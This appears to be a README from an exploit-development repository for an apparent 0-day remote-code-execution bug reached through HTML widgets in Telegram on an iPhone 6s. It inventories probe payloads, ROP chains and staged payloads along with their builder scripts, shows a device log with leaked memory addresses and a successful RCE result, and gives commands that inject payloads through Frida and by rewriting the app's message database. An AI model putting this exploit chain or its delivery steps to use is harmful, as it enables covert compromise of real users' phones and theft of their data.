# iOS hole-reuse payloads (iPhone 6s)

Docs: `vulns/0day-2-RCE-PARSER-SCOPE/TINY/README.md`. The iPhone 17e prepared set is in
`vulns/0day-2-RCE-PARSER-SCOPE/IOS27/payloads/`.

## Probe / final (hole-reuse)

| File | Raw | zlib9 | What |
|---|---:|---:|---|
| `probe-h400.html` | 1,929 | 889 | Device-proven H400 probe: `HIT=545 LEN=327744 PH=36`. |
| `final-h400.html` | 5,583 | 2,355 | Early final with a second executable script. Missed at H400. |
| `probe-h200.html` | 1,929 | 889 | H200 probe. |
| `final-h200.html` | 5,583 | 2,355 | H200 final. |
| `stage-a-2036-h400.html` | 2,036 | 940 | The device-proven 2,036-byte stage A. |
| `seed-stage-b.html` | 3,969 | 1,737 | Stores the 3,617-byte stage B in `n1s2`. `SEED OK 3617`. |
| `seed-inline-rop.html` | 4,600 | 2,124 | Seed for the inline ROP (same length pair). |
| `inline-rop-h200.html` | 4,600 | 2,124 | **The winning inline ROP**, H200. |
| `inline-rop-h150.html` | 4,600 | 2,124 | H150 fallback. |
| `inline-rop-h250.html` | 4,600 | 2,124 | H250 fallback. |
| `inline-rop-h400.html` | 4,600 | 2,124 | H400 fallback. |
| `attribute-rop-h200.html` | 9,336 | 3,568 | Storage-free attribute variant. Missed on device. |

## Tools

| File | What |
|---|---|
| `builders/0day-2/tiny/gen_hole_stage_a.py` | Stage-A generator (`N/H/HN/VK`). |
| `tools/build_payloads.py` | Build the probe/final set. |
| `tools/make_inline_set_4600.py` | Build the 4,600/2,124 inline set. |
| `tools/make_inline_ub_pair.py` | Build the UB-fixed pair. |
| `tools/stage2-host-twin.js` | Host twin of stage B (`N1HOST_OK`). |
| `tools/postbox_rewrite_widget.py` | Copy of the `t7` rewrite tool. |

## Device result (6s)

```
HIT=545 LEN=327744 PH=36 VK=598 NT=21
IOS_N1_OK base=0x10c92c000 printf=0x111ea7c20 rt=0x103f02600 D=0x11c86ca10 leak=FORGED
N1IOS_6S_OK × 64
Documents/rce.txt = RCE_OK, mtime 2026-11-08 05:49:24
```

The 2026-11-05 `RCE_OK` is the n-day. Check the mtime.

## Use

Frida delivery:

```sh
python3 docs/instrumentation/ios6s/deliver_widget_frida_wifi.py \
  --pid <Telegram pid> \
  --html vulns/0day-2-RCE-PARSER-SCOPE/TINY/payloads/probe-h400.html \
  --account-peer <id> --chat-peer <id>
```

Same-widget storage rewrite:

```sh
python3 docs/common/tools/postbox_rewrite_widget.py \
  --db db_sqlite --ns 1 --message-id <row> \
  --html vulns/0day-2-RCE-PARSER-SCOPE/TINY/payloads/inline-rop-h200.html \
  --out db_sqlite.new --expect N1IOS_SEED \
  --preserve-length --pad-html
```

## Names

The original names are in `docs/common/06-glossary.md`.
